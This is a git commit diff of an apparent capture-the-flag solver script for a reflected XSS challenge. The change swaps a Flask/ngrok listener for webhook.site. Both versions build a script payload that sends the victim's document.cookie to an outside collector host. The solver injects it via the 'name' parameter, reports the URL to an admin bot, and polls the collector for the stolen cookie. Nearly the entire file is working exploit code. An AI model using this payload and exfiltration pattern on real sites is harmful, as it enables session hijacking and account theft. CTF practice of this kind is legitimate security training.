b67ad8fa48954b01847d8e93dd99d066c4b305d6
SAW <99191294+nicsaw@users.noreply.github.com>
2025-04-04 20:57:07 +1100

    Use webhook.site

--- ctf/4-XSS/xss_playground_1.py
+++ ctf/4-XSS/xss_playground_1.py
@@ -3,43 +3,37 @@ from pathlib import Path
 sys.path.append(str(Path(__file__).resolve().parent.parent))
 from utils import get_session, find_flag
 
-from flask import Flask, request
-from pyngrok import ngrok
-import threading
+import json
 import time
 
 BASE_URL = "https://xss-playground-1.quoccacorp.com"
-LISTEN_PORT = 8000
-
-app = Flask(__name__)
-
-@app.route('/', methods=["GET", "OPTIONS"])
-def index():
-    for key, value in request.args.items():
-        find_flag(value)
-
-    return "OK"
 
 class Solver:
     def __init__(self):
         self.session = get_session()
-        self.start_server_thread()
-        self.ngrok_public_url = ngrok.connect(LISTEN_PORT, "http").public_url
+        self.webhooksite_uuid = self.get_webhooksite_uuid()
+        self.webhooksite_url = f"https://webhook.site/{self.webhooksite_uuid}"
+        self.webhooksite_requests_url = f"https://webhook.site/token/{self.webhooksite_uuid}/requests"
 
-    def start_server_thread(self):
-        def run_app():
-            app.run(host="0.0.0.0", port=LISTEN_PORT)
-        server_thread = threading.Thread(target=run_app, daemon=True)
-        server_thread.start()
+    def get_webhooksite_uuid(self):
+        response = self.session.post("https://webhook.site/token")
+        return response.json()["uuid"]
+
+    def find_flag_webhooksite(self):
+        time.sleep(2)
+        response = self.session.get(self.webhooksite_requests_url)
+        text = json.dumps(response.json(), indent=2)
+        print(text)
+        find_flag(text)
 
     def main(self):
-        PAYLOAD = f'<script>fetch("{self.ngrok_public_url}/?q=" + document.cookie, {{headers: {{"ngrok-skip-browser-warning": "yes"}}}})</script>'
+        PAYLOAD = f'<script>document.location = "{self.webhooksite_url}/?q=" + document.cookie</script>'
         response = self.session.get(BASE_URL, params={"name": PAYLOAD})
 
         redirect_url = response.url
         self.session.post(f"{BASE_URL}/report", data={"url": redirect_url})
 
-        time.sleep(1)
+        self.find_flag_webhooksite()
 
 if __name__ == "__main__":
     Solver().main()
